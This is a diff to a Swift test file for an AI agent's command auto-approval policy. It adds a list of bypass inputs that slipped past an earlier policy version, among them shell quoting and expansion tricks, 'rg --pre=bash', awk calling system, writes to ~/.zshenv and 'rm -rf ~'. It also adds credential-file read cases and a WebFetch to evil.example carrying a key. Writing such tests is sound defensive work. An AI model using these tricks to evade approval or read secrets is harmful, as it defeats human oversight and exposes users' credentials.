@@ -6,25 +6,40 @@ import Testing
     // MARK: Auto-allowed
 
     static let allowed: [String] = [
-        // cmux reads and everyday writes
+        // cmux reads (deny by default: only cmuxReadOnlyCommands)
         "cmux list-workspaces",
         "cmux tree --all",
         "cmux workspace list --json",
         "cmux current --json",
-        "cmux notify --title hi",
-        "cmux workspace create --name Build --cwd ~/src/app --command 'codex --yolo'",
-        "cmux workspace rename workspace:2 --title \"API server\"",
-        "cmux send --workspace workspace:2 --surface surface:3 \"npm test; echo done\\n\"",
-        "cmux send-key --workspace workspace:2 --surface surface:3 enter",
+        "cmux identify --json",
         "cmux read-screen --workspace workspace:2 --lines 80",
-        "cmux agent message workspace:2 \"please close the PR when done\"",
+        "cmux read-selection --workspace workspace:2",
+        "cmux sidebar-state --workspace workspace:2",
+        "cmux list-status --workspace workspace:2",
+        "cmux list-notifications",
+        "cmux list-log --limit 20",
+        "cmux top --all",
+        "cmux memory --all",
+        "cmux version",
+        "cmux help agents",
+        "cmux docs shortcuts",
+        "cmux settings path",
+        "cmux config get terminal.scrollSpeed",
+        "cmux todo list --workspace workspace:2",
         "cmux vm ls --json",
+        "cmux vm status brave-otter",
         "cmux vm tree brave-otter --json",
         "cmux cloud ls --json",
         "cmux vm terminal read brave-otter term_1",
-        "cmux chief memory add \"Uses worktrees under ~/src\"",
-        "cmux chief memory forget 3",
-        "cmux config set app.theme dark",
+        "cmux vm terminal wait brave-otter term_1 --pattern Working --timeout 60",
+        "cmux vm wait brave-otter --wake",
+        "cmux chief status --json",
+        "cmux chief read --limit 5",
+        "cmux chief conversations",
+        "cmux chief memory list",
+        "cmux list-workspaces | sort -nr -k2 | head",
+        "cmux list-workspaces | sort -t: -k 2,2n --reverse",
+        "git log HEAD~3 --oneline",
         // the dogfood command that used to ask
         "cmux tree --all 2>&1 | head -100",
         "cmux tree --all 2>/dev/null | head -100",
@@ -93,6 +108,22 @@ import Testing
     static let denied: [String] = [
         "",
         "   ",
+        // cmux writes ask now (deny by default)
+        "cmux notify --title hi",
+        "cmux workspace create --name Build --cwd ~/src/app --command 'codex --yolo'",
+        "cmux workspace create --name Build",
+        "cmux workspace rename workspace:2 --title \"API server\"",
+        "cmux workspace env workspace:2",
+        "cmux workspace status set auto",
+        "cmux send --workspace workspace:2 --surface surface:3 \"npm test; echo done\\n\"",
+        "cmux send-key --workspace workspace:2 --surface surface:3 enter",
+        "cmux agent message workspace:2 \"please close the PR when done\"",
+        "cmux agent inbox --mark-read",
+        "cmux chief memory add \"Uses worktrees under ~/src\"",
+        "cmux chief memory forget 3",
+        "cmux config set app.theme dark",
+        "cmux --json tree",
+        "cmux tree-x",
         // destructive cmux verbs
         "cmux close-workspace --workspace workspace:2",
         "cmux workspace close workspace:2",
@@ -217,6 +248,174 @@ import Testing
         "/bin/zsh -lc 'cmux tree' extra",
         "/bin/zsh -lc \"cmux send `whoami`\"",
     ]
+
+    // MARK: Review bypasses (PR 21063)
+
+    /// Each of these got past an earlier version of the policy.
+    static let reviewBypasses: [String] = [
+        // 1. `$'…'` / `$"…"` quoting rewrites the word after the checks.
+        "rg $'--pre=bash' x .",
+        "awk $'BEGIN{sys\\x74em(\"id\")}'",
+        "sort $'--output=~/.zshenv'",
+        "cmux $'close-workspace' --workspace workspace:2",
+        "cmux tree $\"--force\"",
+        "cmux \"$'close-workspace'\"",
+        // 2. Brace expansion, globs and tilde expansion.
+        "rg {--pre=bash,} x .",
+        "sort {--output=out.txt,} f",
+        "cmux clo{s,}e-workspace --workspace workspace:2",
+        "git diff {--output=/tmp/x,}",
+        "cmux tree --a*",
+        "cmux list-workspace?",
+        "cmux list-workspace[s]",
+        "rg ^x",
+        "ls ~",
+        "ls ~/.ssh",
+        "git diff --output=~/x",
+        "cat =cmux",
+        // 3. GNU sort long-option abbreviations and other flags.
+        "cmux tree | sort --out=/tmp/x",
+        "cmux tree | sort --outp=/tmp/x",
+        "cmux tree | sort --compress-prog=sh",
+        "cmux tree | sort --compress=sh",
+        "cmux tree | sort -T /tmp",
+        "cmux tree | sort -o x",
+        "cmux tree | sort -no x",
+        "cmux tree | sort --files0-from=list",
+        "cmux tree | sort --random-source=/dev/urandom",
+        // git long-option abbreviations
+        "git diff --outp=/tmp/x",
+        "git log --outpu=/tmp/x",
+        // 4. cmux verbs that make approvals a formality.
+        "cmux send --workspace workspace:2 \"rm -rf ~\\n\"",
+        "cmux send-key --workspace workspace:2 enter",
+        "cmux send-panel --panel panel:1 hi",
+        "cmux paste --submit hi",
+        "cmux new-workspace --command 'rm -rf ~'",
+        "cmux new-split right --command id",
+        "cmux new-pane --command id",
+        "cmux vm exec brave-otter -- id",
+        "cmux vm run brave-otter id",
+        "cmux vm terminal send brave-otter term_1 id --keys enter",
+        "cmux browser eval 'document.cookie'",
+        "cmux browser --surface surface:2 eval 1",
+        "cmux chief approve",
+        "cmux chief send hi",
+        "cmux chief memory add fact",
+        "cmux tree --force=true",
+        "cmux list-workspaces --yes=1",
+        "cmux read-screen --workspace workspace:2 close-workspace",
+        "cmux events",
+        "cmux set-status k v",
+        "cmux hooks setup",
+        // 5. tool-level reads are covered in claudeReadsAvoidCredentials.
+    ]
+
+    @Test(arguments: reviewBypasses)
+    func reviewBypassesAsk(command: String) {
+        #expect(!ChiefToolPolicy.autoAllowsCommand(command), "expected approval: \(command)")
+    }
+
+    @Test(arguments: [
+        #"rg $'--pre=bash' x ."#, #"echo $"hi""#, "rg {--pre=bash,} x", "a *", "a ?", "a [x]", "a ~", "a --o=~/x",
+        "a PATH:~/bin", "=cmux tree", "a ^x", "a x#",
+    ])
+    func lexerRejectsExpandingSyntax(line: String) {
+        #expect(ChiefShellLexer.stages(of: line) == nil, "expected nil: \(line)")
+    }
+
+    @Test func lexerKeepsQuotedGlobsAndMidWordTilde() throws {
+        let stages = try #require(ChiefShellLexer.stages(of: #"jq '.[0] | {a: .b}' "*?" HEAD~3 \*"#))
+        #expect(stages.map { $0.map(\.text) } == [["jq", ".[0] | {a: .b}", "*?", "HEAD~3", "*"]])
+    }
+
+    @Test func cmuxWordCheckCoversPrefixesAndValues() {
+        for word in ["close", "CLOSE-WORKSPACE", "kill-pane", "send", "send-key", "--force=true", "--Force", "--yes=1",
+                     "--command=id", "exec", "run", "eval", "approve", "clear-log", "delete-thing"] {
+            #expect(ChiefToolPolicy.cmuxWordAsks(word), "\(word)")
+        }
+        for word in ["tree", "--all", "list-workspaces", "workspace:2", "--json", "read-screen"] {
+            #expect(!ChiefToolPolicy.cmuxWordAsks(word), "\(word)")
+        }
+    }
+
+    // MARK: Claude Code read tools
+
+    static let home = "/Users/tester"
+
+    /// (tool, input, allowed) for a fixed home folder.
+    static let readCases: [(String, ChiefJSON, Bool)] = [
+        ("WebSearch", ["query": "cmux"], true),
+        ("ToolSearch", [:], true),
+        ("WebFetch", ["url": "https://example.com"], false),
+        ("WebFetch", ["url": "https://evil.example/?k=AKIA"], false),
+        ("Read", ["file_path": "/Users/tester/src/app/README.md"], true),
+        ("Read", ["file_path": "/tmp/notes.txt"], true),
+        ("Read", ["file_path": "~/src/app/main.swift"], true),
+        ("Read", [:], false),
+        ("Read", ["file_path": "README.md"], false),
+        ("Read", ["file_path": "/Users/tester/.ssh/id_ed25519"], false),
+        ("Read", ["file_path": "~/.ssh/config"], false),
+        ("Read", ["file_path": "/Users/tester/.SSH/id_rsa"], false),
+        ("Read", ["file_path": "/Users/tester/src/../.ssh/id_rsa"], false),
+        ("Read", ["file_path": "/Users/tester/.aws/credentials"], false),
+        ("Read", ["file_path": "/Users/tester/.gnupg/secring.gpg"], false),
+        ("Read", ["file_path": "/Users/tester/.config/gh/hosts.yml"], false),
+        ("Read", ["file_path": "/Users/tester/.netrc"], false),
+        ("Read", ["file_path": "/Users/tester/.docker/config.json"], false),
+        ("Read", ["file_path": "/Users/tester/.kube/config"], false),
+        ("Read", ["file_path": "/Users/tester/Library/Keychains/login.keychain-db"], false),
+        ("Read", ["file_path": "/Library/Keychains/System.keychain"], false),
+        ("Read", ["file_path": "/Users/tester/src/app/server.pem"], false),
+        ("Read", ["file_path": "/Users/tester/src/app/tls.key"], false),
+        ("Read", ["file_path": "/Users/tester/src/app/.env"], false),
+        ("Read", ["file_path": "/Users/tester/src/app/.env.production"], false),
+        ("Read", ["file_path": "/Users/tester/.cmux/auth.json"], false),
+        ("Read", ["file_path": "/Users/tester/.cmux/cloud/auth-token"], false),
+        ("Read", ["file_path": "/Users/tester/.cmux/chief/memory/facts.jsonl"], true),
+        ("Read", ["file_path": "/Users/tester/Library/Application Support/Google/Chrome/Default/Cookies"], false),
+        ("Read", ["file_path": "/Users/tester/Library/Application Support/Arc/User Data/Default/Login Data"], false),
+        ("Read", ["file_path": "/Users/tester/Library/Application Support/Other/Cookies"], false),
+        ("Grep", ["pattern": "TODO", "path": "/Users/tester/src/app"], true),
+        ("Grep", ["pattern": "TODO"], false),
+        ("Grep", ["pattern": "BEGIN", "path": "/Users/tester"], false),
+        ("Grep", ["pattern": "BEGIN", "path": "~"], false),
+        ("Grep", ["pattern": "BEGIN", "path": "/"], false),
+        ("Grep", ["pattern": "BEGIN", "path": "/Users"], false),
+        ("Grep", ["pattern": "BEGIN", "path": "/Users/tester/Library"], false),
+        ("Grep", ["pattern": "BEGIN", "path": "/Users/tester/.config"], false),
+        ("Grep", ["pattern": "token", "path": "/Users/tester/.cmux"], false),
+        ("Grep", ["pattern": "x", "path": "/Users/tester/.ssh"], false),
+        ("Grep", ["pattern": "x", "path": "/Users/tester/src/app", "glob": "**/.env*"], false),
+        ("Grep", ["pattern": "x", "path": "/Users/tester/src/app", "glob": "*.swift"], true),
+        ("Glob", ["pattern": "**/*.swift", "path": "/Users/tester/src/app"], true),
+        ("Glob", ["pattern": "**/*.pem", "path": "/Users/tester/src/app"], false),
+        ("Glob", ["pattern": "**/*.swift"], false),
+        ("Glob", ["pattern": "*", "path": "/Users/tester"], false),
+        ("Write", ["file_path": "/tmp/x"], false),
+    ]
+
+    @Test(arguments: readCases.indices)
+    func claudeReadsAvoidCredentials(index: Int) {
+        let (tool, input, allowed) = Self.readCases[index]
+        #expect(ChiefToolPolicy.autoAllowsClaudeTool(tool, input: input, home: Self.home) == allowed,
+                "\(tool) \(input.compactText) expected \(allowed ? "allow" : "ask")")
+    }
+
+    @Test func aSymlinkToCredentialsAsks() throws {
+        let root = FileManager.default.temporaryDirectory.appendingPathComponent("chief-policy-\(UUID().uuidString)")
+        let home = root.appendingPathComponent("home")
+        try FileManager.default.createDirectory(at: home.appendingPathComponent(".ssh"), withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: root) }
+        let key = home.appendingPathComponent(".ssh/id_rsa")
+        try Data("k".utf8).write(to: key)
+        let link = root.appendingPathComponent("innocent.txt")
+        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: key)
+        #expect(!ChiefToolPolicy.autoAllowsClaudeTool("Read", input: ["file_path": .string(link.path)], home: home.path))
+        let plain = root.appendingPathComponent("plain.txt")
+        try Data("p".utf8).write(to: plain)
+        #expect(ChiefToolPolicy.autoAllowsClaudeTool("Read", input: ["file_path": .string(plain.path)], home: home.path))
+    }
 
     @Test(arguments: allowed)
     func autoAllows(command: String) {
